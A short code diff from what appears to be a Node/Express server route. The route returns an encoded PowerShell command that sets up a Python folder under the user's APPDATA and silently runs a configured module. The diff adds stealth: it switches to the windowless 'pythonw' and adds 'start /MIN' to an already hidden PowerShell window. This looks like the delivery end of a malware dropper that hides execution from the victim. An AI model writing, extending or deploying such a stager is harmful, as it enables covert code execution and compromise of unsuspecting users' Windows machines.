@@ -20,7 +20,7 @@ router.get("/", (req, res) => {
 
     const payload = `
 function Get-Arch() {$arch = (Get-CimInstance Win32_OperatingSystem).OSArchitecture;if ($arch -like '64*') {'amd64'}else{'win32'}}
-function Run-The-Module() {.\\python -m ${config.module.name} ${moduleArgs}}
+function Run-The-Module() {.\\pythonw -m ${config.module.name} ${moduleArgs}}
 cd $env:APPDATA
 $FolderName = 'python313'
 if((Test-Path $FolderName) -and (Test-Path 'hasPython')) {cd $FolderName;Run-The-Module;exit}else{if(Test-Path $FolderName) {rm $FolderName -Recurse -Force};mkdir $FolderName;cd $FolderName}
@@ -39,7 +39,7 @@ Run-The-Module
         return res.send(encodePayload(payload))
     }
 
-    res.send(`start powershell -WindowStyle Hidden -c "${encodePayload(payload)}"`)
+    res.send(`start /MIN powershell -WindowStyle Hidden -c "${encodePayload(payload)}"`)
 })
 
 function encodePayload(code) {
